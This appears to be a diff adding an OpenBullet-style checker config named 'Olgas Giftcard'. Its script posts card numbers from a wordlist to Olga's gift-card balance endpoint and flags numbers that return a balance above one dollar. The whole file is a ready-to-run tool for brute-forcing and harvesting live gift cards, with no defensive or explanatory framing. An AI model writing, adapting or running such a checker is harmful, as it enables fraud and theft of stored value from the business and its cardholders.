@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Olgas Giftcard",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-19T14:45:35.774827+01:00",
+  "AdditionalInfo": "",
+  "Author": "Coaster",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.olgas.com/getGiftCardBalance.php" 
+  CONTENT "cardNumber=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.olgas.com" 
+  HEADER "Origin: https://www.olgas.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.olgas.com/gift-cards/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 25" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "$" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "$" 
+
+PARSE "<SOURCE>" LR "" "" -> CAP "" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" LessThan "1.00" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" GreaterThan "1.00" 
+
